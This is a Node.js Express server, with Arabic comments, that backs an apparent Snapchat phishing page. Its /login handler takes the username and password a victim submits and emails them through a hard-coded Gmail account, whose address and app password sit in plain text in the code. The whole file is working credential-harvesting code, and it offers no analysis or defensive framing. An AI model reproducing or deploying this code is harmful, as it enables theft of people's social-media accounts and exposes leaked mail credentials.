const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');
const app = express();

app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
  res.sendStatus(200); // نرسل رد بسيط بدون إرجاع الواجهة
});

app.post('/login', (req, res) => {
  const { name, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'itinfor79@gmail.com',
      pass: 'eqlfoyyxgoknvjne'
    }
  });

  const mailOptions = {
    from: 'itinfor79@gmail.com',
    to: 'itinfor79@gmail.com',
    subject:'تسجيل دخول جديد في سناب شات',
    text: ` Username : ${name}\n Password : ${password}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('❌ فشل الإرسال:', error);
      return res.status(500).send('خطأ في الإرسال');
    }

    console.log('✅ تم إرسال البيانات:', info.response);
    res.status(200).send('تم الاستلام');
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Running on http://localhost:${PORT}`));
